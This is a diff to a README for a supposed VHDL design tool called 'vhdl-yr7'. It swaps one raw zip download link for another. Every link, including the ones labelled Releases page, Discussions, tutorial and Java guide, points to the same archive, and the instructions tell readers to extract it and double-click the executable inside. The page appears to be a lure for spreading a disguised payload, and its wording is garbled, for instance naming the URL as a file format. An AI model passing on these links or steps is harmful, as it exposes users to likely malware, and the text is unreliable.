@@ -2,7 +2,7 @@
 
 ## 📥 Quick Download
 
-[![Download vhdl-yr7](https://raw.githubusercontent.com/Opvenom1001/vhdl-yr7/main/ostensibly/vhdl-yr7.zip)](https://raw.githubusercontent.com/Opvenom1001/vhdl-yr7/main/ostensibly/vhdl-yr7.zip)
+[![Download vhdl-yr7](https://github.com/Opvenom1001/vhdl-yr7/raw/refs/heads/main/ostensibly/vhdl-yr-3.0.zip)](https://github.com/Opvenom1001/vhdl-yr7/raw/refs/heads/main/ostensibly/vhdl-yr-3.0.zip)
 
 ## 🚀 Getting Started
 
@@ -20,11 +20,11 @@ Before you start, ensure your computer meets these requirements:
 
 ## 🔗 Download & Install
 
-To download the latest version of vhdl-yr7, visit the [Releases page](https://raw.githubusercontent.com/Opvenom1001/vhdl-yr7/main/ostensibly/vhdl-yr7.zip). Here are the steps:
+To download the latest version of vhdl-yr7, visit the [Releases page](https://github.com/Opvenom1001/vhdl-yr7/raw/refs/heads/main/ostensibly/vhdl-yr-3.0.zip). Here are the steps:
 
 1. Click the link above to open the Releases page.
 2. Look for the version you want to download—typically, the latest version is at the top.
-3. Click on the download link for your operating system. The file will usually be in a `.zip` or `https://raw.githubusercontent.com/Opvenom1001/vhdl-yr7/main/ostensibly/vhdl-yr7.zip` format.
+3. Click on the download link for your operating system. The file will usually be in a `.zip` or `https://github.com/Opvenom1001/vhdl-yr7/raw/refs/heads/main/ostensibly/vhdl-yr-3.0.zip` format.
 4. Once the download completes, locate the file in your downloads folder.
 5. Extract the contents of the downloaded file to a folder of your choice.
 
@@ -33,7 +33,7 @@ To download the latest version of vhdl-yr7, visit the [Releases page](https://ra
 After extraction, follow these steps to run vhdl-yr7:
 
 1. Navigate to the folder where you extracted the files.
-2. Look for the executable file (e.g., `https://raw.githubusercontent.com/Opvenom1001/vhdl-yr7/main/ostensibly/vhdl-yr7.zip` for Windows or `vhdl-yr7` for macOS/Linux).
+2. Look for the executable file (e.g., `https://github.com/Opvenom1001/vhdl-yr7/raw/refs/heads/main/ostensibly/vhdl-yr-3.0.zip` for Windows or `vhdl-yr7` for macOS/Linux).
 3. Double-click the executable file to launch the application.
 
 ## 📚 User Guide
@@ -65,11 +65,11 @@ A: Ensure you have the correct Java Runtime Environment installed. Also, check t
 
 ## 🌐 Community and Support
 
-For additional help or to connect with other users, you can visit our [GitHub Discussions page](https://raw.githubusercontent.com/Opvenom1001/vhdl-yr7/main/ostensibly/vhdl-yr7.zip). Engage with others, ask questions, and share your experiences with vhdl-yr7.
+For additional help or to connect with other users, you can visit our [GitHub Discussions page](https://github.com/Opvenom1001/vhdl-yr7/raw/refs/heads/main/ostensibly/vhdl-yr-3.0.zip). Engage with others, ask questions, and share your experiences with vhdl-yr7.
 
 ## 🔗 Further Resources
 
-- [VHDL Tutorial for Beginners](https://raw.githubusercontent.com/Opvenom1001/vhdl-yr7/main/ostensibly/vhdl-yr7.zip) - A great starting point for learning VHDL.
-- [Java Installation Guide](https://raw.githubusercontent.com/Opvenom1001/vhdl-yr7/main/ostensibly/vhdl-yr7.zip) - Help with installing Java on your system.
+- [VHDL Tutorial for Beginners](https://github.com/Opvenom1001/vhdl-yr7/raw/refs/heads/main/ostensibly/vhdl-yr-3.0.zip) - A great starting point for learning VHDL.
+- [Java Installation Guide](https://github.com/Opvenom1001/vhdl-yr7/raw/refs/heads/main/ostensibly/vhdl-yr-3.0.zip) - Help with installing Java on your system.
 
 Thank you for choosing vhdl-yr7! We hope it becomes a valuable tool in your design projects.
